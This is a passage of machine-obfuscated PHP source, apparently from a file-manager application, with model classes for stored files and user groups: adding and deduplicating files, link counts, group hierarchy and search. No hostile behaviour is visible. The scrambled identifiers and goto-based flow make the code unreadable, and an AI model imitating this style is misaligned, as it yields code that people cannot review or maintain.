strlen($eáÍ™Û«çˆ[$EˆˆÍ…ñ»[164]]) > 32) { $eáÍ™Û«çˆ[$EˆˆÍ…ñ»[77]] = intval(substr($eáÍ™Û«çˆ[$EˆˆÍ…ñ»[164]], 32)); } $bª“š½’‚‹ = $this->add($eáÍ™Û«çˆ); return $this->find($bª“š½’‚‹); } public function addFile($C˜äø±äÂ, $aëóŒ³¼¥ , $A³‡‡¥±Î” = false) { $e¯Æ¦‚í© = IO::hashSimple($C˜äø±äÂ); $d¬÷ÒÒÍÂ = IO::hashMd5($C˜äø±äÂ); $F”òÓŠ¯ = IO::size($C˜äø±äÂ); if ($då‘ˆ‰š = $this->addFileCheckExist($e¯Æ¦‚í©, $d¬÷ÒÒÍÂ, $F”òÓŠ¯)) { return $då‘ˆ‰š; } $eğ„„Î‚¸¡ = $this->addFileMake($C˜äø±äÂ, $F”òÓŠ¯, $e¯Æ¦‚í©, $d¬÷ÒÒÍÂ, $aëóŒ³¼¥ , $A³‡‡¥±Î”); return $this->addFileData($eğ„„Î‚¸¡); } public function addFileMake($fĞ‹“Îøµ, $CÃŸê´Ù, $Fö…í³¢…¬, $d‘…Â±¦÷, $Dƒ¾½²ßêë, $eÇ¹ß×Şá˜) { goto dãòÂˆ”œ»; bÂï­Ùõ™’: $cÉ­àÀÏÃŞ = get_path_this($f±¸æƒéÑÙ); if ($eÇ¹ß×Şá˜) { $f¿ï‰ŒÅ±¦ = IO::move($fĞ‹“Îøµ, $F×½ßÕµÇ«, !1, $cÉ­àÀÏÃŞ); } else { $f¿ï‰ŒÅ±¦ = IO::copy($fĞ‹“Îøµ, $F×½ßÕµÇ«, !1, $cÉ­àÀÏÃŞ); } if (!$f¿ï‰ŒÅ±¦) { return !1; } goto FÓÔå¶È â; FÓÔå¶È â: $F­Ñ·À”„è = KodIO::defaultDriver(); $B·š…ˆå…õ = array($Aù„‘÷Š[520] => $CÃŸê´Ù, $Aù„‘÷Š[2155] => 1, $Aù„‘÷Š[386] => $Dƒ¾½²ßêë, $Aù„‘÷Š[734] => $F­Ñ·À”„è[$Aù„‘÷Š[367]], $Aù„‘÷Š[387] => $f±¸æƒéÑÙ, $Aù„‘÷Š[2156] => $Fö…í³¢…¬, $Aù„‘÷Š[2157] => $d‘…Â±¦÷); return $B·š…ˆå…õ; goto A‡¼Ë¢ˆ¦£; dãòÂˆ”œ»: $Aù„‘÷Š =& $_SERVER[Æ]; $f±¸æƒéÑÙ = $this->createFileName($Dƒ¾½²ßêë); $F×½ßÕµÇ« = get_path_father($f±¸æƒéÑÙ); goto bÂï­Ùõ™’; A‡¼Ë¢ˆ¦£: } public function addFileCheckExist($e‚Ì¿…Éõ, $d‰‚±¶á, $aªØÆô¾˜”) { $Fáƒë›©²ù =& $_SERVER[Æ]; $C¸—ˆ™œ¥¿ = $this->findByHash($e‚Ì¿…Éõ, $d‰‚±¶á); if (!$C¸—ˆ™œ¥¿) { return !1; } $fâÔ©›´‰â = array($Fáƒë›©²ù[2155] => intval($C¸—ˆ™œ¥¿[$Fáƒë›©²ù[2158]]) + 1, $Fáƒë›©²ù[520] => $aªØÆô¾˜”); $this->where(array($Fáƒë›©²ù[420] => $C¸—ˆ™œ¥¿[$Fáƒë›©²ù[419]]))->save($fâÔ©›´‰â); return $C¸—ˆ™œ¥¿; } public function remove($B›ÙÂßÎ‘ø) { $this->linkCountChange($B›ÙÂßÎ‘ø, !1); $this->clearEmpty(); return !0; } public function linkAdd($CäãØêÊ”) { $this->linkCountChange($CäãØêÊ”, !0); } public function linkCountChange($Eã¯Ç† ·, $E˜¡‡´ãÉ˜) { goto AŸìªÔÀø; eù—ó¿¿©¢: $E¼”‡Ó¼Û = array(); foreach ($Eã¯Ç† · as $C÷²ª¡ù) { $Có®¹ÜËµ = $C÷²ª¡ù . $D‚ÉÁİÁ½[33]; if (!$E¼”‡Ó¼Û[$Có®¹ÜËµ]) { $E¼”‡Ó¼Û[$Có®¹ÜËµ] = 0; } $E¼”‡Ó¼Û[$Có®¹ÜËµ]++; } $c·ã¯¾á© = array(); goto FôŞÃÍ–à«; AŸìªÔÀø: $D‚ÉÁİÁ½ =& $_SERVER[Æ]; if (!$Eã¯Ç† ·) { return; } if (!is_array($Eã¯Ç† ·)) { $Eã¯Ç† · = array($Eã¯Ç† ·); } goto eù—ó¿¿©¢; FôŞÃÍ–à«: foreach ($E¼”‡Ó¼Û as $C÷²ª¡ù => $c†‚òÍ›Åõ) { $Có®¹ÜËµ = $c†‚òÍ›Åõ . $D‚ÉÁİÁ½[33]; if (!$c·ã¯¾á©[$Có®¹ÜËµ]) { $c·ã¯¾á©[$Có®¹ÜËµ] = array(); } $c·ã¯¾á©[$Có®¹ÜËµ][] = $C÷²ª¡ù; } foreach ($c·ã¯¾á© as $c†‚òÍ›Åõ => $a©§éŠˆ Š) { if (!$a©§éŠˆ Š) { continue; } $c†‚òÍ›Åõ = $E˜¡‡´ãÉ˜ ? $c†‚òÍ›Åõ : -intval($c†‚òÍ›Åõ); $cø¸Ô†Ó´ = array($D‚ÉÁİÁ½[419] => array($D‚ÉÁİÁ½[7], $a©§éŠˆ Š)); if ($c†‚òÍ›Åõ < 0) { $cø¸Ô†Ó´[$D‚ÉÁİÁ½[2158]] = array($D‚ÉÁİÁ½[930], abs($c†‚òÍ›Åõ)); } $this->where($cø¸Ô†Ó´)->setAdd($D‚ÉÁİÁ½[2158], $c†‚òÍ›Åõ); } goto dÄ „•¦ï; dÄ „•¦ï: } public function findByHash($bŠ¯İî‘Š, $a³ğŞÆ“÷Í = false) { $eØ Ô¸¿ËÊ =& $_SERVER[Æ]; if (!$bŠ¯İî‘Š && !$a³ğŞÆ“÷Í) { return !1; } $eŒ•Ï‘éÛÜ = array($eØ Ô¸¿ËÊ[2156] => $bŠ¯İî‘Š); if ($a³ğŞÆ“÷Í) { $eŒ•Ï‘éÛÜ = array($eØ Ô¸¿ËÊ[2157] => $a³ğŞÆ“÷Í); } return $this->order($eØ Ô¸¿ËÊ[2159])->where($eŒ•Ï‘éÛÜ)->find(); } public function clearEmpty($A¾çò­º“‡ = 0) { goto EÄ÷ÄËËŸ; EÄ÷ÄËËŸ: $f”¶Â‰¸à‚ =& $_SERVER[Æ]; $bŞ›§ñ’Åï = time() - 3600 * 24 * $A¾çò­º“‡; $EÜŒİäç×® = $f”¶Â‰¸à‚[2160] . $bŞ›§ñ’Åï; goto d÷œíÕŒ°‚; c Âù¿Úå: foreach ($e«¼˜Îá¢‘ as $f¸©ÍÙªòË) { $a»ÒÙªÛà->update(1); $this->resetFile($f¸©ÍÙªòË); } $a»ÒÙªÛà->end(); goto B¹¼Íàæª; d÷œíÕŒ°‚: $e«¼˜Îá¢‘ = $this->where($EÜŒİäç×®)->select(); if (!$e«¼˜Îá¢‘) { return; } $a»ÒÙªÛà = new Task($f”¶Â‰¸à‚[2161], $f”¶Â‰¸à‚[33], count($e«¼˜Îá¢‘)); goto c Âù¿Úå; B¹¼Íàæª: } private function resetFile($C—¬ÃÈ®™ë) { goto fÊÙç¤†æ³; dËÈß›ìƒä: if ($C—¬ÃÈ®™ë[$b£¶èËºØ[2158]] != $f»†Ù±¸·¬) { $this->where($C¦‡Û™±Ë¶)->save(array($b£¶èËºØ[2155] => $f»†Ù±¸·¬)); } goto c©«¬¾á×‡; fÊÙç¤†æ³: $b£¶èËºØ =& $_SERVER[Æ]; $C¦‡Û™±Ë¶ = array($b£¶èËºØ[420] => $C—¬ÃÈ®™ë[$b£¶èËºØ[419]]); $C¯©ã®‰— = Model($b£¶èËºØ[1117])->where($C¦‡Û™±Ë¶)->count(); goto a©ÊÏËÙæ„; a©ÊÏËÙæ„: $aÕ¯çíŒ† = Model($b£¶èËºØ[2162])->where($C¦‡Û™±Ë¶)->count(); $f»†Ù±¸·¬ = intval($C¯©ã®‰—) + intval($aÕ¯çíŒ†); if ($f»†Ù±¸·¬ == 0) { IO::remove($C—¬ÃÈ®™ë[$b£¶èËºØ[75]]); $this->where($C¦‡Û™±Ë¶)->delete(); $this->metaSet($C—¬ÃÈ®™ë[$b£¶èËºØ[419]], null, null); return; } goto dËÈß›ìƒä; c©«¬¾á×‡: } public function storageInfo($aÚ“å¹Æµ¡ = false) { goto d¹†¯°Úœ; fİá­šöå®: $FÎªÕ®éñø = 1; $a¸ÒÙ±ÁØœ = 0; $C®ÀÚ¹«à = 5000; goto EÈ½‘çïËœ; EÈ½‘çïËœ: for ($f²”ª¿ó„ = 0; $f²”ª¿ó„ < $C£‡ï¤õ†Ô; $f²”ª¿ó„ = $f²”ª¿ó„ + $C®ÀÚ¹«à) { $FŒ¦óË‹­… = $this->limit($f²”ª¿ó„, $f²”ª¿ó„ + $C®ÀÚ¹«à)->select(); foreach ($FŒ¦óË‹­… as $A‚°Œƒâ) { $FÎªÕ®éñø += $A‚°Œƒâ[$CÙëõÈ‚Üš[77]] * $A‚°Œƒâ[$CÙëõÈ‚Üš[2158]]; $e„òí´›Œ„ += $A‚°Œƒâ[$CÙëõÈ‚Üš[77]] * ($A‚°Œƒâ[$CÙëõÈ‚Üš[2158]] - 1); $a¸ÒÙ±ÁØœ += $A‚°Œƒâ[$CÙëõÈ‚Üš[2158]]; } } $DÄøõè = array($CÙëõÈ‚Üš[2163] => $FÎªÕ®éñø, $CÙëõÈ‚Üš[2164] => $e„òí´›Œ„, $CÙëõÈ‚Üš[2165] => $e„òí´›Œ„ / $FÎªÕ®éñø, $CÙëõÈ‚Üš[81] => $C£‡ï¤õ†Ô, $CÙëõÈ‚Üš[2166] => $a¸ÒÙ±ÁØœ); return $DÄøõè; goto BÁÜÊ–”‚‹; d¹†¯°Úœ: $CÙëõÈ‚Üš =& $_SERVER[Æ]; $C£‡ï¤õ†Ô = $this->count() + 0.0; $e„òí´›Œ„ = 0; goto fİá­šöå®; BÁÜÊ–”‚‹: } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\x6f\165\x70"; protected $tableMeta = array("\x74\x61\x62\154\145\116\x61\155\x65" => "\x67\162\157\165\x70\x5f\x6d\x65\x74\141", "\x6d\145\x74\141\x46\x69\x65\154\x64" => "\147\162\x6f\x75\x70\x49\x44"); protected function cacheFunctionAlias($Eëä¨¼…) { $BìñÖÈ­’ =& $_SERVER[Æ]; return array($BìñÖÈ­’[2167] => array($Eëä¨¼…[0], $BìñÖÈ­’[2168]), $BìñÖÈ­’[2169] => array($Eëä¨¼…[0], $BìñÖÈ­’[2168])); } protected function getInfo($F„æÎ¯ÏÊ†) { $DÏø£¨¦¼ = $this->getInfoSimple($F„æÎ¯ÏÊ†); if (!$DÏø£¨¦¼) { return !1; } return $this->_listDataApplyItem($DÏø£¨¦¼); } protected function getInfoSimple($eÌ”î¢ÉÖ», $BÔ¡ƒóÆ›„ = false) { $fë‰é‚Ã•¿ =& $_SERVER[Æ]; if ($BÔ¡ƒóÆ›„) { $AÀÍ£Ó„ßÔ = array($fë‰é‚Ã•¿[2101] => intval($eÌ”î¢ÉÖ»)); $B‰òƒ¶Ş¶™ = $this->where($AÀÍ£Ó„ßÔ)->find(); return is_array($B‰òƒ¶Ş¶™) ? $B‰òƒ¶Ş¶™ : array(); } return $this->cacheFunctionGet($fë‰é‚Ã•¿[2170], $eÌ”î¢ÉÖ»); } protected function groupAdd($Dß¤–İÈêµ) { goto AãÓ¾‰ÅÓÁ; Fèä†³Óì¤: if ($b¬ˆæÁ «‘[$f“·ß‚ĞœÍ[459]]) { $døøİÔ ¾ = $b¬ˆæÁ «‘[$f“·ß‚ĞœÍ[459]] . $b¬ˆæÁ «‘[$f“·ß‚ĞœÍ[2101]] . $f“·ß‚ĞœÍ[47]; } $eŞ©Ş¾ãÌÄ = array($f“·ß‚ĞœÍ[386] => $this->groupNameAuto($Dß¤–İÈêµ[$f“·ß‚ĞœÍ[461]], $Dß¤–İÈêµ[$f“·ß‚ĞœÍ[28]]), $f“·ß‚ĞœÍ[368] => $Dß¤–İÈêµ[$f“·ß‚ĞœÍ[461]], $f“·ß‚ĞœÍ[525] => $døøİÔ ¾, $f“·ß‚ĞœÍ[2171] => $Dß¤–İÈêµ[$f“·ß‚ĞœÍ[2085]], $f“·ß‚ĞœÍ[2172] => 0, $f“·ß‚ĞœÍ[2105] => 0); if (isset($Dß¤–İÈêµ[$f“·ß‚ĞœÍ[2122]])) { $eŞ©Ş¾ãÌÄ[$f“·ß‚ĞœÍ[2122]] = $Dß¤–İÈêµ[$f“·ß‚ĞœÍ[2122]]; } else { $Fé¨¢‡ãµ› = $this->max($f“·ß‚ĞœÍ[2122]); if (!$Fé¨¢‡ãµ›) { $Fé¨¢‡ãµ› = 0; } $eŞ©Ş¾ãÌÄ[$f“·ß‚ĞœÍ[2122]] = $Fé¨¢‡ãµ› + 1; } goto AªƒíÍ‘Áø; AãÓ¾‰ÅÓÁ: $f“·ß‚ĞœÍ =& $_SERVER[Æ]; if (!$Dß¤–İÈêµ[$f“·ß‚ĞœÍ[461]] && isset($Dß¤–İÈêµ[$f“·ß‚ĞœÍ[2101]]) && $Dß¤–İÈêµ[$f“·ß‚ĞœÍ[2101]] == 1) { if ($b¬ˆæÁ «‘ = $this->getInfoSimple($Dß¤–İÈêµ[$f“·ß‚ĞœÍ[2101]], !0)) { return $Dß¤–İÈêµ[$f“·ß‚ĞœÍ[2101]]; } } else { $b¬ˆæÁ «‘ = $this->getInfoSimple($Dß¤–İÈêµ[$f“·ß‚ĞœÍ[461]]); if (!$b¬ˆæÁ «‘) { return !1; } } $døøİÔ ¾ = $f“·ß‚ĞœÍ[470]; goto Fèä†³Óì¤; AªƒíÍ‘Áø: if (!empty($Dß¤–İÈêµ[$f“·ß‚ĞœÍ[2101]])) { $eŞ©Ş¾ãÌÄ[$f“·ß‚ĞœÍ[2101]] = $Dß¤–İÈêµ[$f“·ß‚ĞœÍ[2101]]; } $D› ”¼ = $this->add($eŞ©Ş¾ãÌÄ); $this->setNamePinyin($D› ”¼, $eŞ©Ş¾ãÌÄ[$f“·ß‚ĞœÍ[28]]); goto aÛ†À…¬Œ·; aÛ†À…¬Œ·: Model($f“·ß‚ĞœÍ[1117])->groupRootAdd($D› ”¼); return $D› ”¼; goto eÛêÄÛ¾Ò®; eÛêÄÛ¾Ò®: } protected function groupEdit($b©²¡ÄÌõ÷, $EŠèİÏÛÉ£) { $EœÇ–“ÉÔá =& $_SERVER[Æ]; if (!empty($EŠèİÏÛÉ£[$EœÇ–“ÉÔá[461]])) { $A•ô¼‡·ƒµ = $this->getInfoSimple($b©²¡ÄÌõ÷); $d»à’•„„ç = $this->getInfoSimple($EŠèİÏÛÉ£[$EœÇ–“ÉÔá[461]]); if (!$A•ô¼‡·ƒµ || !$d»à’•„„ç) { return !1; } if ($A•ô¼‡·ƒµ[$EœÇ–“ÉÔá[2101]] == $d»à’•„„ç[$EœÇ–“ÉÔá[2101]]) { return !1; } if ($EŠèİÏÛÉ£[$EœÇ–“ÉÔá[461]] != $A•ô¼‡·ƒµ[$EœÇ–“ÉÔá[461]]) { if ($d»à’•„„ç[$EœÇ–“ÉÔá[459]] !== $A•ô¼‡·ƒµ[$EœÇ–“ÉÔá[459]] && strpos($d»à’•„„ç[$EœÇ–“ÉÔá[459]], $A•ô¼‡·ƒµ[$EœÇ–“ÉÔá[459]] . $A•ô¼‡·ƒµ[$EœÇ–“ÉÔá[2101]] . $EœÇ–“ÉÔá[47]) === 0) { return !1; } $EŠèİÏÛÉ£[$EœÇ–“ÉÔá[525]] = $d»à’•„„ç[$EœÇ–“ÉÔá[459]] . $EŠèİÏÛÉ£[$EœÇ–“ÉÔá[461]] . $EœÇ–“ÉÔá[47]; $this->_changeChildLevel($A•ô¼‡·ƒµ, $d»à’•„„ç); } } if (isset($EŠèİÏÛÉ£[$EœÇ–“ÉÔá[28]])) { $this->setNamePinyin($b©²¡ÄÌõ÷, $EŠèİÏÛÉ£[$EœÇ–“ÉÔá[28]]); } return $this->where(array($EœÇ–“ÉÔá[2173] => $b©²¡ÄÌõ÷))->save($EŠèİÏÛÉ£); } private function _changeChildLevel($AŠ˜àµª›Ù, $bÙšß†ƒóÚ, $A½Õ¦è·´Ş = false) { goto D‡×ñê³; d¬‹™Ü‹: if ($A½Õ¦è·´Ş) { $c°¤é¶»„ä = $bÙšß†ƒóÚ[$aÏ‚Ã¹ƒßõ[459]] . $bÙšß†ƒóÚ[$aÏ‚Ã¹ƒßõ[2101]] . $aÏ‚Ã¹ƒßõ[47]; } $b‡ë×œ½Î® = array($aÏ‚Ã¹ƒßõ[525] => array($aÏ‚Ã¹ƒßõ[483], $AŠ˜àµª›Ù[$aÏ‚Ã¹ƒßõ[459]] . $AŠ˜àµª›Ù[$aÏ‚Ã¹ƒßõ[2101]] . $aÏ‚Ã¹ƒßõ[484])); $e†äÙ•÷Îˆ = array($aÏ‚Ã¹ƒßõ[525] => array($aÏ‚Ã¹ƒßõ[534], "\x72\x65\160\154\x61\x63\x65\x28\160\141\x72\145\156\x74\114\x65\x76\x65\x6c\x2c\x27{$FÇ©İÆ’Ä}\x27\x2c\47{$c°¤é¶»„ä}\47\x29")); goto F‚ëÄñ°½±; D‡×ñê³: $aÏ‚Ã¹ƒßõ =& $_SERVER[Æ]; $FÇ©İÆ’Ä = $AŠ˜àµª›Ù[$aÏ‚Ã¹ƒßõ[459]] . $AŠ˜àµª›Ù[$aÏ‚Ã¹ƒßõ[2101]] . $aÏ‚Ã¹ƒßõ[47]; $c°¤é¶»„ä = $bÙšß†ƒóÚ[$aÏ‚Ã¹ƒßõ[459]] . $bÙšß†ƒóÚ[$aÏ‚Ã¹ƒßõ[2101]] . $aÏ‚Ã¹ƒßõ[47] . $AŠ˜àµª›Ù[$aÏ‚Ã¹ƒßõ[2101]] . $aÏ‚Ã¹ƒßõ[47]; goto d¬‹™Ü‹; F‚ëÄñ°½±: $this->where($b‡ë×œ½Î®)->data($e†äÙ•÷Îˆ)->save(); goto fÏğë–åÂâ; fÏğë–åÂâ: } public function setNamePinyin($A›ô½„ÂÈ´, $eŒŞ„ÙÂİÔ = false) { $d½ê¿Ü…Ü½ =& $_SERVER[Æ]; if (!$eŒŞ„ÙÂİÔ) { $aøôƒŞöîÈ = $this->getInfoSimple($A›ô½„ÂÈ´); $eŒŞ„ÙÂİÔ = $aøôƒŞöîÈ[$d½ê¿Ü…Ü½[28]]; } if (!Input::check($eŒŞ„ÙÂİÔ, $d½ê¿Ü…Ü½[528])) { $this->metaSet($A›ô½„ÂÈ´, $d½ê¿Ü…Ü½[416], null); $this->metaSet($A›ô½„ÂÈ´, $d½ê¿Ü…Ü½[415], null); return; } $D‰¡ºÄƒñ = array($d½ê¿Ü…Ü½[416] => str_replace($d½ê¿Ü…Ü½[50], $d½ê¿Ü…Ü½[33], Pinyin::encode($eŒŞ„ÙÂİÔ)), $d½ê¿Ü…Ü½[415] => Pinyin::encode($eŒŞ„ÙÂİÔ, $d½ê¿Ü…Ü½[529])); $this->metaSet($A›ô½„ÂÈ´, $D‰¡ºÄƒñ); } protected function groupStatus($bíê©æªô, $A¯ºõÕºàÍ) { goto e©Œ§ØÓä; e©Œ§ØÓä: $AêÊÜæÄ²ê =& $_SERVER[Æ]; $cŒ¸×†¿ì = $this->getInfoSimple($bíê©æªô); if (!$cŒ¸×†¿ì) { return !1; } goto b‘†ÚÎˆôĞ; b‘†ÚÎˆôĞ: if ($A¯ºõÕºàÍ == $AêÊÜæÄ²ê[83]) { $AóÓ«šß¥™ = $this->parentLevelArray($cŒ¸×†¿ì[$AêÊÜæÄ²ê[459]]); } else { $DĞÛÑŠ£ëõ = array($AêÊÜæÄ²ê[525] => array($AêÊÜæÄ²ê[483], $cŒ¸×†¿ì[$AêÊÜæÄ²ê[459]] . $cŒ¸×†¿ì[$AêÊÜæÄ²ê[2101]] . $AêÊÜæÄ²ê[484])); $AóÓ«šß¥™ = $this->where($DĞÛÑŠ£ëõ)->field($AêÊÜæÄ²ê[2101])->select(); $AóÓ«šß¥™ = array_to_keyvalue($AóÓ«šß¥™, $AêÊÜæÄ²ê[33], $AêÊÜæÄ²ê[2101]); } $AóÓ«šß¥™[] = $cŒ¸×†¿ì[$AêÊÜæÄ²ê[2101]]; $cËÂĞå×ŠË = array(); goto fó¿ã¨¤²; fó¿ã¨¤²: foreach ($AóÓ«šß¥™ as $bíê©æªô) { $cËÂĞå×ŠË[] = array($AêÊÜæÄ²ê[2101] => $bíê©æªô, $AêÊÜæÄ²ê[89] => $AêÊÜæÄ²ê[687], $AêÊÜæÄ²ê[359] => $A¯ºõÕºàÍ); } return Model($AêÊÜæÄ²ê[2174])->addAll($cËÂĞå×ŠË, array(), !0); goto Bæ³›ŠÍåØ; Bæ³›ŠÍåØ: } private function _groupStatusApply($EèÔé®¶¿¬, $FÄÀÚ×í©£) { $a³«ŠÆ¬ß¬ =& $_SERVER[Æ]; if ($FÄÀÚ×í©£ == $a³«ŠÆ¬ß¬[83]) { $eº¢°ˆë†ˆ = $this->parentLevelArray($EèÔé®¶¿¬[$a³«ŠÆ¬ß¬[459]]); } else { $eäÒ¢ò›§œ = array($a³«ŠÆ¬ß¬[525] => array($a³«ŠÆ¬ß¬[483], $EèÔé®¶¿¬[$a³«ŠÆ¬ß¬[459]] . $EèÔé®¶¿¬[$a³«ŠÆ¬ß¬[2101]] . $a³«ŠÆ¬ß¬[484])); $eº¢°ˆë†ˆ = $this->where($eäÒ¢ò›§œ)->field($a³«ŠÆ¬ß¬[2101])->select(); $eº¢°ˆë†ˆ = array_to_keyvalue($eº¢°ˆë†ˆ, $a³«ŠÆ¬ß¬[33], $a³«ŠÆ¬ß¬[2101]); } if (empty($eº¢°ˆë†ˆ)) { return; } $fĞ»¨ù›çä = array(); foreach ($eº¢°ˆë†ˆ as $aßåáÏ½îÊ) { $fĞ»¨ù›çä[] = array($a³«ŠÆ¬ß¬[2101] => $aßåáÏ½îÊ, $a³«ŠÆ¬ß¬[89] => $a³«ŠÆ¬ß¬[687], $a³«ŠÆ¬ß¬[359] => $FÄÀÚ×í©£); } Model($a³«ŠÆ¬ß¬[2174])->addAll($fĞ»¨ù›çä, array(), !0); } protected function groupRemove($cÒÔŞ™ô´²) { goto B§óŞî«„Û; Dš®½çËĞÛ: $this->where(array($Aºæ£ƒ¶ˆ[461] => $cÒÔŞ™ô´²))->save(array($Aºæ£ƒ¶ˆ[461] => $aÄÈ”Æ»¯[$Aºæ£ƒ¶ˆ[461]])); Model($Aºæ£ƒ¶ˆ[2174])->where($CŒ£¼øÁ)->delete(); Model($Aºæ£ƒ¶ˆ[2175])->where($CŒ£¼øÁ)->delete(); goto DœËÜâ™îİ; B§óŞî«„Û: $Aºæ£ƒ¶ˆ =& $_SERVER[Æ]; $CŒ£¼øÁ = array($Aºæ£ƒ¶ˆ[2101] => $cÒÔŞ™ô´²); $aÄÈ”Æ»¯ = $this->where($CŒ£¼øÁ)->find(); goto Eî‡å«§í; DœËÜâ™îİ: Model($Aºæ£ƒ¶ˆ[751])->groupRootRemove($cÒÔŞ™ô´²); return $this->where($CŒ£¼øÁ)->delete(); goto aÁ­µåéİ¯; Eî‡å«§í: if (!$aÄÈ”Æ»¯ || $aÄÈ”Æ»¯[$Aºæ£ƒ¶ˆ[461]] == 0) { return !1; } $EîÄ†ˆ’æ = $this->getInfoSimple($aÄÈ”Æ»¯[$Aºæ£ƒ¶ˆ[461]]); $this->_changeChildLevel($aÄÈ”Æ»¯, $EîÄ†ˆ’æ, !0); goto Dš®½çËĞÛ; aÁ­µåéİ¯: } public function listData() { $AœÊ•æï = $this->_makeOrder()->selectPage(50); $this->_listDataApply($AœÊ•æï[$_SERVER[Æ][354]]); return $AœÊ•æï; } private function _makeOrder($D´ß¤ä«ì = '') { goto fìòğÕğ›¹; c¾À¬ÙØ„š: $Aº¢òÙÓÆ = Input::get($aà†¡áŠ†æ[407], $aà†¡áŠ†æ[7], $aà†¡áŠ†æ[2105], $C“×‚…¦“á); $bÃ´ãòÖ‡µ = Input::get($aà†¡áŠ†æ[408], $aà†¡áŠ†æ[7], $aà†¡áŠ†æ[2176], array($aà†¡áŠ†æ[2176], $aà†¡áŠ†æ[404])); $bÃ´ãòÖ‡µ = $D±¯ÛŠŒçù[$bÃ´ãòÖ‡µ]; goto Aƒù—¾«›Š; Aƒù—¾«›Š: $D´ß¤ä«ì = $D´ß¤ä«ì . "{$Aº¢òÙÓÆ}\x20{$bÃ´ãòÖ‡µ}\54\x20\147\162\x6f\x75\160\111\x44\40\x61\x73\x63"; return $this->order($D´ß¤ä«ì); goto eñ­…ÏÉªè; fìòğÕğ›¹: $aà†¡áŠ†æ =& $_SERVER[Æ]; $C“×‚…¦“á = array($aà†¡áŠ†æ[2101], $aà†¡áŠ†æ[28], $aà†¡áŠ†æ[2087], $aà†¡áŠ†æ[187]); $D±¯ÛŠŒçù = array($aà†¡áŠ†æ[402] => $aà†¡áŠ†æ[403], $aà†¡áŠ†æ[404] => $aà†¡áŠ†æ[405]); goto c¾À¬ÙØ„š; eñ­…ÏÉªè: } public function listChild($FÌøÂÙ©ºØ) { $FØ¡”ã¨ =& $_SERVER[Æ]; $aÃÍî÷¿ ¿ = $this->where(array($FØ¡”ã¨[461] => $FÌøÂÙ©ºØ))->_makeOrder()->selectPage(200); $this->_listDataApply($aÃÍî÷¿ ¿[$FØ¡”ã¨[354]]); return $aÃÍî÷¿ ¿; } public function listByID($fÓ¤ëâè¾) { $Dæ…ÜãğÉÕ =& $_SERVER[Æ]; if (!$fÓ¤ëâè¾) { return array(); } $D¥‰ç£òéÍ = array($Dæ…ÜãğÉÕ[2101] => array($Dæ…ÜãğÉÕ[7], $fÓ¤ëâè¾)); $Fù×çà†Ş = $this->where($D¥‰ç£òéÍ)->select(); $this->_listDataApply($Fù×çà†Ş); return $Fù×çà†Ş; } public function listSearch($aÇ£è»çİ) { goto BÛõ¬§¢†; BÑÓÓ½²Ä: if (!trim($Dß‚ƒàÓà¢)) { return !1; } $Dß‚ƒàÓà¢ = str_replace($cªğâ‰Äˆ[2179], $cªğâ‰Äˆ[2180], $Dß‚ƒàÓà¢); $aä“½õ™ © = array($cªğâ‰Äˆ[2101] => array($cªğâ‰Äˆ[750], "\45{$Dß‚ƒàÓà¢}\45"), $cªğâ‰Äˆ[28] => array($cªğâ‰Äˆ[750], "\45{$Dß‚ƒàÓà¢}\45"), $cªğâ‰Äˆ[915] => $cªğâ‰Äˆ[2181]); goto c±±ğ´‡ñ©; c±±ğ´‡ñ©: $f•…ŠµÄŞ = $this->_makeOrder()->where($aä“½õ™ ©)->selectPage(20); $f•…ŠµÄŞ = $f•…ŠµÄŞ ? $f•…ŠµÄŞ : array(); if (!$f•…ŠµÄŞ || count($f•…ŠµÄŞ[$cªğâ‰Äˆ[354]]) < 5 && Input::check($Dß‚ƒàÓà¢, $cªğâ‰Äˆ[306])) { $c™Ğ¦Œˆ†… = $this->_searchFromMeta($cªğâ‰Äˆ[415], $Dß‚ƒàÓà¢, 10); $F›¥ ĞÔ¥ = $this->_searchFromMeta($cªğâ‰Äˆ[416], $Dß‚ƒàÓà¢, 10); $E™çéóŒ¯Ä = array_merge($c™Ğ¦Œˆ†…, $F›¥ ĞÔ¥, $f•…ŠµÄŞ[$cªğâ‰Äˆ[354]]); $f•…ŠµÄŞ[$cªğâ‰Äˆ[354]] = array_unique_by_key($E™çéóŒ¯Ä, $cªğâ‰Äˆ[2101]); $f•…ŠµÄŞ[$cªğâ‰Äˆ[351]][$cªğâ‰Äˆ[352]] = count($f•…ŠµÄŞ[$cªğâ‰Äˆ[354]]); $f•…ŠµÄŞ[$cªğâ‰Äˆ[351]][$cªğâ‰Äˆ[353]] = ceil($f•…ŠµÄŞ[$cªğâ‰Äˆ[351]][$cªğâ‰Äˆ[352]] / $f•…ŠµÄŞ[$cªğâ‰Äˆ[351]][$cªğâ‰Äˆ[349]]); } goto d»îµÇÃô¶; BÛõ¬§¢†: $cªğâ‰Äˆ =& $_SERVER[Æ]; $Dß‚ƒàÓà¢ = $aÇ£è»çİ[$cªğâ‰Äˆ[2177]]; $c®Ë¥Äñ¦¨ = isset($aÇ£è»çİ[$cªğâ‰Äˆ[2178]]) ? $aÇ£è»çİ[$cªğâ‰Äˆ[2178]] : !1; goto BÑÓÓ½²Ä; d»îµÇÃô¶: $this->_listDataApply($f•…ŠµÄŞ[$cªğâ‰Äˆ[354]]); return $f•…ŠµÄŞ; goto bÌæš±éÑÊ; bÌæš±éÑÊ: } private function _searchFromMeta($cùÉ¢ç¼ôá, $dãóáòîæÂ, $CÍê®œİ¦) { goto B†”Äàƒ§; bÉùå÷‚®Ø: $b¡ôÔ‚‘óŠ = $this->where(array($CƒÄŠ°Ö×§[2173] => array($CƒÄŠ°Ö×§[7], $f§äÊƒèÕË)))->select(); if (!$b¡ôÔ‚‘óŠ) { return array(); } return $b¡ôÔ‚‘óŠ; goto d¬îß‡ÔÓ£; cåÖ–ß—ë†: $f§äÊƒèÕË = Model($CƒÄŠ°Ö×§[2182])->where($Cˆ”ÒÚš˜å)->limit($CÍê®œİ¦)->select(); if (!$f§äÊƒèÕË) { return array(); } $f§äÊƒèÕË = array_to_keyvalue($f§äÊƒèÕË, $CƒÄŠ°Ö×§[33], $CƒÄŠ°Ö×§[2101]); goto bÉùå÷‚®Ø; B†”Äàƒ§: $CƒÄŠ°Ö×§ =& $_SERVER[Æ]; $dãóáòîæÂ = strtolower($dãóáòîæÂ); $Cˆ”ÒÚš˜å = array($CƒÄŠ°Ö×§[89] => $cùÉ¢ç¼ôá, $CƒÄŠ°Ö×§[359] => array($CƒÄŠ°Ö×§[750], "\45{$dãóáòîæÂ}\45")); goto cåÖ–ß—ë†; d¬îß‡ÔÓ£: } protected function _listDataApplyItem($aˆ©›‘ ï) { 